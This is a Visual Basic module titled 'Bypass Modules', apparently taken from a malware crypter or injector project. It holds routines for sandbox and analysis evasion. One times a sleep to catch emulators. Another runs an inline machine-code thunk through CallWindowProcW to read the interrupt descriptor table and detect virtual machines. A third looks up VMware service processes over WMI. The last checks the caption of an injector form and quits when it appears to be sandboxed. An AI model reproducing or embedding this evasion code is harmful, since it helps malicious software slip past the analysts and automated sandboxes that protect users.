Attribute VB_Name = "Module1"
'Bypass Modules
'Credits to:
'slayer616, SQuEeZer, Karcrack, carb0n

Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal lngMilliseconds As Long)
Private Declare Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare Function CallThunk8 Lib "USER32" Alias "CallWindowProcW" (ByRef cThunk As Currency, Optional ByVal Param1 As Long, Optional ByVal Param2 As Long, Optional ByVal Param3 As Long, Optional ByVal Param4 As Long) As Long

Public Function AntiEmulator() As Boolean
Dim TimeNow As Long
Dim TimeAfterSleep As Long
TimeNow = GetTickCount
Sleep 500
TimeAfterSleep = GetTickCount
If TimeAfterSleep - TimeNow < 500 Then
AntiEmulator = True
Else
AntiEmulator = False
End If
End Function

Public Function ImVirtualized() As Boolean
Dim tIDT(2 + 4)     As Byte
Call CallThunk8(-439297879751758.3221@, ByVal VarPtr(tIDT(0)))
ImVirtualized = (tIDT(5) > &HD0)
End Function

Public Function Vmware() As Boolean
If VerProceso("VMwareService.exe") = True Or VerProceso("VMwareUser.exe") = True Or VerProceso("VMwareTray.exe") = True Then
Vmware = True
Else
Vmware = False
End If
End Function

Function VerProceso(Proceso As String) As Boolean
On Error Resume Next
Dim xProc, sInicio

sInicio = "winmgmts://" & ""
For Each xProc In GetObject(sInicio).InstancesOf("win32_process")
If UCase(xProc.Name) = UCase(Proceso) Then
VerProceso = True
Exit Function
End If
Next
VerProceso = False
Exit Function
End Function

Public Sub InStrAnti()
Boxie = InStr(frmInject.Caption, "[#]")
If Boxie = 1 Then End
End Sub
